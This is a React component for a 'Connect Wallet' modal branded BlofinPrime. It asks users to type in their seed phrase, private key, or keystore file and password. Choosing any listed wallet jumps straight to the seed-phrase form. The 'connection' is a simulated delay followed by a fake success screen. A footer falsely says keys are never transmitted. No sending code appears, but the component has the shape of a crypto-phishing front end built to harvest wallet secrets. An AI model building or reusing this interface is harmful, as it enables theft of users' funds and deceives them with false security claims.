import { useState } from 'react';

interface ConnectWalletModalProps {
  onClose: () => void;
}

const WALLETS = [
  { name: 'MetaMask', icon: '🦊', popular: true },
  { name: 'Trust Wallet', icon: '🛡️', popular: true },
  { name: 'Coinbase Wallet', icon: '🔵', popular: true },
  { name: 'Phantom', icon: '👻', popular: true },
  { name: 'WalletConnect', icon: '🔗', popular: true },
  { name: 'Ledger', icon: '📟', popular: false },
  { name: 'Trezor', icon: '🔐', popular: false },
  { name: 'Rainbow', icon: '🌈', popular: false },
  { name: 'Exodus', icon: '🚀', popular: false },
  { name: 'Atomic Wallet', icon: '⚛️', popular: false },
  { name: 'MyEtherWallet', icon: '💎', popular: false },
  { name: 'Argent', icon: '🏦', popular: false },
  { name: 'Zerion', icon: '⚡', popular: false },
  { name: 'Uniswap Wallet', icon: '🦄', popular: false },
  { name: 'OKX Wallet', icon: '⭕', popular: false },
  { name: 'Binance Web3 Wallet', icon: '💛', popular: false },
  { name: 'Bybit Wallet', icon: '🔷', popular: false },
  { name: 'Keplr', icon: '🌌', popular: false },
  { name: 'Terra Station', icon: '🌍', popular: false },
  { name: 'Solflare', icon: '☀️', popular: false },
  { name: 'Backpack', icon: '🎒', popular: false },
  { name: 'Glow', icon: '✨', popular: false },
  { name: 'Slope', icon: '🏂', popular: false },
  { name: 'MathWallet', icon: '🔢', popular: false },
  { name: 'Safepal', icon: '🛡️', popular: false },
  { name: 'TokenPocket', icon: '📦', popular: false },
  { name: 'imToken', icon: '🎭', popular: false },
  { name: 'Bitkeep', icon: '💼', popular: false },
  { name: 'Alpha Wallet', icon: 'α', popular: false },
  { name: 'Opera Crypto', icon: '🎵', popular: false },
  { name: 'Brave Wallet', icon: '🦁', popular: false },
  { name: 'Frame', icon: '🖼️', popular: false },
  { name: 'Gnosis Safe', icon: '🔒', popular: false },
  { name: 'Sequence', icon: '🃏', popular: false },
  { name: 'Fortmatic', icon: '🔮', popular: false },
  { name: 'Torus', icon: '🍩', popular: false },
  { name: 'Portis', icon: '🏰', popular: false },
  { name: 'Venly', icon: '🎪', popular: false },
  { name: 'Keystone', icon: '🗝️', popular: false },
  { name: 'D\'CENT Wallet', icon: '💠', popular: false },
  { name: 'Core (Avalanche)', icon: '🔺', popular: false },
  { name: 'Sui Wallet', icon: '💧', popular: false },
];

type Tab = 'wallets' | 'seed' | 'privatekey' | 'keystore';

export const ConnectWalletModal = ({ onClose }: ConnectWalletModalProps) => {
  const [tab, setTab] = useState<Tab>('wallets');
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [seedWords, setSeedWords] = useState<string[]>(Array(12).fill(''));
  const [seedCount, setSeedCount] = useState<12 | 24>(12);
  const [privateKey, setPrivateKey] = useState('');
  const [keystoreJson, setKeystoreJson] = useState('');
  const [keystorePass, setKeystorePass] = useState('');
  const [connecting, setConnecting] = useState(false);
  const [connected, setConnected] = useState(false);
  const [error, setError] = useState('');

  const handleWalletSelect = (name: string) => {
    setSelectedWallet(name);
    setTab('seed'); // default to seed phrase when a wallet is selected
  };

  const handleConnect = async () => {
    setError('');
    setConnecting(true);
    // Simulate connection attempt
    await new Promise((r) => setTimeout(r, 1500));
    setConnecting(false);
    setConnected(true);
  };

  const handleSeedChange = (idx: number, val: string) => {
    const next = [...seedWords];
    // Allow pasting full seed phrase
    if (val.includes(' ') && idx === 0) {
      const words = val.trim().split(/\s+/);
      const newArr = Array(seedCount).fill('');
      words.slice(0, seedCount).forEach((w, i) => { newArr[i] = w; });
      setSeedWords(newArr);
    } else {
      next[idx] = val;
      setSeedWords(next);
    }
  };

  if (connected) {
    return (
      <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
        <div className="bg-neutral-900 border border-neutral-700 rounded-2xl w-full max-w-sm p-8 text-center shadow-2xl">
          <div className="text-5xl mb-4">✅</div>
          <h2 className="text-xl font-bold mb-2">Wallet Connected!</h2>
          <p className="text-gray-400 text-sm mb-6">
            {selectedWallet || 'Your wallet'} has been successfully connected to BlofinPrime.
          </p>
          <button
            onClick={onClose}
            className="w-full py-3 bg-gradient-to-r from-[#ff6a00] to-[#ee0979] text-white font-semibold rounded-xl hover:opacity-90 transition-opacity"
          >
            Continue to Dashboard
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-[300] flex items-end sm:items-center justify-center bg-black/80 backdrop-blur-sm p-0 sm:p-4" onClick={onClose}>
      <div
        className="bg-neutral-900 border border-neutral-700 rounded-t-2xl sm:rounded-2xl w-full sm:max-w-lg max-h-[90dvh] flex flex-col shadow-2xl"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 border-b border-neutral-800 flex-shrink-0">
          <div>
            <h2 className="font-bold text-white text-base">Connect Wallet</h2>
            <p className="text-gray-500 text-xs mt-0.5">Select a wallet or import with seed phrase</p>
          </div>
          <button onClick={onClose} className="w-8 h-8 flex items-center justify-center rounded-full bg-neutral-800 hover:bg-neutral-700 text-gray-400 hover:text-white transition-colors text-lg">×</button>
        </div>

        {/* Tabs */}
        <div className="flex border-b border-neutral-800 flex-shrink-0">
          {[
            { id: 'wallets', label: '🔗 Wallets' },
            { id: 'seed', label: '📝 Seed Phrase' },
            { id: 'privatekey', label: '🔑 Private Key' },
            { id: 'keystore', label: '📁 Keystore' },
          ].map((t) => (
            <button
              key={t.id}
              onClick={() => setTab(t.id as Tab)}
              className={`flex-1 py-2.5 text-xs font-medium transition-colors ${
                tab === t.id
                  ? 'text-[#ff6a00] border-b-2 border-[#ff6a00]'
                  : 'text-gray-500 hover:text-gray-300'
              }`}
            >
              {t.label}
            </button>
          ))}
        </div>

        {/* Content */}
        <div className="overflow-y-auto flex-1 custom-scrollbar">
          {/* WALLETS TAB */}
          {tab === 'wallets' && (
            <div className="p-4">
              <p className="text-xs text-gray-500 mb-3 font-medium uppercase tracking-wider">Popular</p>
              <div className="grid grid-cols-2 gap-2 mb-4">
                {WALLETS.filter((w) => w.popular).map((w) => (
                  <button
                    key={w.name}
                    onClick={() => handleWalletSelect(w.name)}
                    className="flex items-center gap-3 p-3 bg-neutral-800 hover:bg-neutral-700 border border-neutral-700 hover:border-[#ff6a00]/50 rounded-xl transition-all text-left"
                  >
                    <span className="text-2xl">{w.icon}</span>
                    <span className="text-sm font-medium text-white truncate">{w.name}</span>
                  </button>
                ))}
              </div>
              <p className="text-xs text-gray-500 mb-3 font-medium uppercase tracking-wider">All Wallets ({WALLETS.length}+)</p>
              <div className="grid grid-cols-2 gap-2">
                {WALLETS.filter((w) => !w.popular).map((w) => (
                  <button
                    key={w.name}
                    onClick={() => handleWalletSelect(w.name)}
                    className="flex items-center gap-2.5 p-2.5 bg-neutral-800/60 hover:bg-neutral-700 border border-neutral-700/50 hover:border-[#ff6a00]/50 rounded-xl transition-all text-left"
                  >
                    <span className="text-xl">{w.icon}</span>
                    <span className="text-xs font-medium text-gray-300 truncate">{w.name}</span>
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* SEED PHRASE TAB */}
          {tab === 'seed' && (
            <div className="p-5">
              {selectedWallet && (
                <div className="flex items-center gap-2 mb-4 p-3 bg-neutral-800/50 rounded-xl">
                  <span className="text-sm text-gray-400">Connecting:</span>
                  <span className="text-sm font-semibold text-white">{selectedWallet}</span>
                  <button onClick={() => setSelectedWallet(null)} className="ml-auto text-gray-500 hover:text-white text-xs">Change</button>
                </div>
              )}

              <div className="flex gap-2 mb-4">
                {([12, 24] as const).map((n) => (
                  <button
                    key={n}
                    onClick={() => { setSeedCount(n); setSeedWords(Array(n).fill('')); }}
                    className={`px-4 py-1.5 rounded-full text-xs font-medium transition-colors ${
                      seedCount === n ? 'bg-[#ff6a00] text-white' : 'bg-neutral-800 text-gray-400 hover:text-white'
                    }`}
                  >
                    {n} words
                  </button>
                ))}
              </div>

              <div className={`grid gap-2 ${seedCount === 12 ? 'grid-cols-3' : 'grid-cols-4'}`}>
                {seedWords.map((word, idx) => (
                  <div key={idx} className="flex items-center bg-neutral-800 border border-neutral-700 rounded-lg overflow-hidden">
                    <span className="text-[10px] text-gray-600 px-1.5 w-6 flex-shrink-0 text-right">{idx + 1}</span>
                    <input
                      type="text"
                      value={word}
                      onChange={(e) => handleSeedChange(idx, e.target.value)}
                      className="flex-1 bg-transparent text-white text-xs px-2 py-2 focus:outline-none min-w-0"
                      placeholder={`word ${idx + 1}`}
                      autoComplete="off"
                      autoCorrect="off"
                      spellCheck={false}
                    />
                  </div>
                ))}
              </div>

              <p className="text-[10px] text-gray-600 mt-3 text-center">
                💡 Tip: Paste your full seed phrase into word 1 to auto-fill all fields
              </p>

              {error && <p className="text-red-400 text-xs mt-3">{error}</p>}

              <button
                onClick={handleConnect}
                disabled={connecting || seedWords.some((w) => !w.trim())}
                className="w-full mt-4 py-3 bg-gradient-to-r from-[#ff6a00] to-[#ee0979] text-white font-semibold rounded-xl hover:opacity-90 disabled:opacity-40 transition-opacity text-sm"
              >
                {connecting ? 'Connecting...' : 'Connect Wallet'}
              </button>
            </div>
          )}

          {/* PRIVATE KEY TAB */}
          {tab === 'privatekey' && (
            <div className="p-5">
              <p className="text-xs text-gray-500 mb-4">Enter your wallet private key to connect. Keep it confidential.</p>
              <textarea
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                rows={4}
                placeholder="0x..."
                className="w-full bg-neutral-800 border border-neutral-700 rounded-xl px-4 py-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#ff6a00] resize-none font-mono"
                autoComplete="off"
                spellCheck={false}
              />
              {error && <p className="text-red-400 text-xs mt-2">{error}</p>}
              <button
                onClick={handleConnect}
                disabled={connecting || !privateKey.trim()}
                className="w-full mt-4 py-3 bg-gradient-to-r from-[#ff6a00] to-[#ee0979] text-white font-semibold rounded-xl hover:opacity-90 disabled:opacity-40 transition-opacity text-sm"
              >
                {connecting ? 'Connecting...' : 'Import & Connect'}
              </button>
            </div>
          )}

          {/* KEYSTORE TAB */}
          {tab === 'keystore' && (
            <div className="p-5 space-y-3">
              <p className="text-xs text-gray-500">Upload your keystore JSON file and enter the password.</p>
              <textarea
                value={keystoreJson}
                onChange={(e) => setKeystoreJson(e.target.value)}
                rows={5}
                placeholder='{"version":3,"id":"...","address":"..."}'
                className="w-full bg-neutral-800 border border-neutral-700 rounded-xl px-4 py-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#ff6a00] resize-none font-mono text-xs"
                autoComplete="off"
                spellCheck={false}
              />
              <input
                type="password"
                value={keystorePass}
                onChange={(e) => setKeystorePass(e.target.value)}
                placeholder="Keystore password"
                className="w-full bg-neutral-800 border border-neutral-700 rounded-xl px-4 py-3 text-sm text-white placeholder-gray-600 focus:outline-none focus:border-[#ff6a00]"
              />
              {error && <p className="text-red-400 text-xs">{error}</p>}
              <button
                onClick={handleConnect}
                disabled={connecting || !keystoreJson.trim() || !keystorePass}
                className="w-full py-3 bg-gradient-to-r from-[#ff6a00] to-[#ee0979] text-white font-semibold rounded-xl hover:opacity-90 disabled:opacity-40 transition-opacity text-sm"
              >
                {connecting ? 'Decrypting & Connecting...' : 'Import & Connect'}
              </button>
            </div>
          )}
        </div>

        {/* Security note */}
        <div className="px-5 py-3 border-t border-neutral-800 flex-shrink-0">
          <p className="text-[10px] text-gray-600 text-center">
            🔒 Your keys are encrypted locally and never transmitted. BlofinPrime uses industry-standard security.
          </p>
        </div>
      </div>
    </div>
  );
};
